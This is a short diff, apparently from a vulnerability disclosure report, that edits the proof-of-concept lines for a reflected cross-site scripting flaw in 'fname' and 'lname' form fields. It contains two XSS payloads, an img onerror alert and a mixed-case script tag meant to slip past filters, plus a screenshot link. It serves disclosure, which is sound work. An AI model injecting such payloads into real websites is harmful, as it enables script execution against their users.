@@ -19,9 +19,9 @@ A Reflected Cross-Site Scripting (XSS) vulnerability exists within the fname and
 <!-- Add screenshots, HTTP requests/responses, payloads, or videos that demonstrate the vulnerability. -->
 1.Input form populated with the exact payloads.
 
-fname:    s@t"><img src=x onerror=alert('First')> 
+    s@t"><img src=x onerror=alert('First')> 
   
-lname:    s@t"><scRipt>alert("Last")</scriPt>
+    s@t"><scRipt>alert("Last")</scriPt>
 
 <img width="1920" height="972" alt="1" src="https://github.com/user-attachments/assets/2d323b0a-e359-4f81-96af-50b9ce8fa49e" />
 
